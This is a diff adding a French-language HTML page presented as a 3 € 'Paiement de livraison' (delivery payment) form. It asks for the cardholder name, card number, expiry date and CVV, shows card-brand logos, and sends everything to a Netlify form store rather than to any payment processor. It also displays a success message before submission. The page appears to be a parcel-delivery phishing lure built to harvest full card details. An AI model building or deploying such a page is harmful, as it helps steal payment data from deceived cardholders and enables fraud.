@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Paiement de livraison</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .payment-container {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      width: 300px;
+      max-width: 90%;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+    .btn {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .btn:hover {
+      background-color: #0056b3;
+    }
+    .card-icons {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    .card-icons img {
+      height: 30px;
+      margin: 0 4px;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .half {
+      width: 100%;
+    }
+    .input-icon {
+      position: relative;
+      width: 100%;
+    }
+    .input-icon input {
+      padding-right: 35px;
+    }
+    .input-icon img {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      height: 18px;
+      opacity: 0.6;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-container">
+    <div class="card-icons">
+      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard">
+      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
+      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
+      <img src="https://img.icons8.com/color/48/000000/jcb.png" alt="JCB">
+    </div>
+    <h2>Paiement de livraison</h2>
+    <form name="paiement" method="POST" data-netlify="true">
+      <input type="text" name="nom" placeholder="Nom sur la carte" required>
+      <div class="input-icon">
+        <input type="text" name="numero" placeholder="N° de carte" required>
+        <img src="https://cdn-icons-png.flaticon.com/512/633/633611.png" alt="carte">
+      </div>
+      <div class="row">
+        <input type="text" name="expiration" placeholder="MM/AA" required class="half">
+        <input type="text" name="cvv" placeholder="CVV" required class="half">
+      </div>
+      <p style="color: green; font-size: 14px; text-align: center; margin-top: 10px;">
+        ✅ Merci ! Votre code de confirmation vous sera envoyé sous peu.
+      </p>
+      <button class="btn" type="submit">Payer 3 €</button>
+    </form>
+  </div>
+</body>
+</html>
